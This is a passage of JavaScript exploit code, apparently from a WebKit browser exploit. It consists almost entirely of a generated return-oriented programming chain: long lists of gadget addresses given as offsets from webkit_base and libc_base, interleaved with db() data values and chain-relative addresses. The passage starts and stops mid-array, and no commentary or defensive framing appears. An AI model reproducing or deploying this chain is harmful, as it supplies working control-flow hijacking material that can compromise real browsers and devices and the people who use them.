webkit_base+6227286, 
libc_base+793877, 
ropchain+164400, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+164368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+164352, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+164456, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+164560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+164592, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+164576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+164688, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+164672, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+164824, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+164808, 
webkit_base+7438103, 
libc_base+206806, 
ropchain+128, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+164968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+164936, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+164952, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+165056, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+165120, 
webkit_base+7438103, 
libc_base+788575, 
ropchain+128, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+793877, 
ropchain+165176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+165256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+165312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+165440, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+165424, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+165536, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+165552, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+165664, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+165648, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
write_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+166992, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+167064, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+167176, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+167192, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+167280, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+167296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+167416, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+167432, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+167400, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+167528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+167544, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+167656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+167640, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+167744, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+167728, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+167840, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+167856, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+167968, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+167952, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+168040, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+168152, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+168168, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+168256, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+168272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+168424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+168456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+168408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+168440, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+168616, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+168584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+168568, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+168744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+168760, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+168728, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+168856, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+168872, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+168984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+168968, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+169072, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+169056, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+169168, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+169184, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+169296, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+169280, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+169368, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+169480, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+169496, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+169584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+169600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+169760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+169728, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+169712, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+169816, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+169920, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+169952, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+169936, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+170112, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+170080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+170064, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+170216, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+170200, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877546, 
libc_base+793877, 
ropchain+170424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+170392, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+170528, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+170512, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+170624, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+170712, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+170728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+170888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+170856, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+170840, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+170944, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+171048, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+171080, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+171064, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+171240, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+171208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+171192, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+171344, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+171328, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+171544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+171512, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+171648, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+171632, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877568, 
libc_base+793877, 
ropchain+171760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+171728, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+171824, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+171880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877, 
ropchain+172024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+172040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+172008, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+172200, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+172168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+172152, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+172328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+172344, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+172312, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+172440, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+172456, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+172568, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+172552, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+172656, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+172640, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+172752, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+172768, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+172880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+172864, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+172952, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+173016, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+173160, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+173264, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([61, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+173464, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+173552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+173568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+173720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+173752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+173704, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+173736, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+173848, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+173832, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+173952, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+175944, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+174088, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+174104, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+174072, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
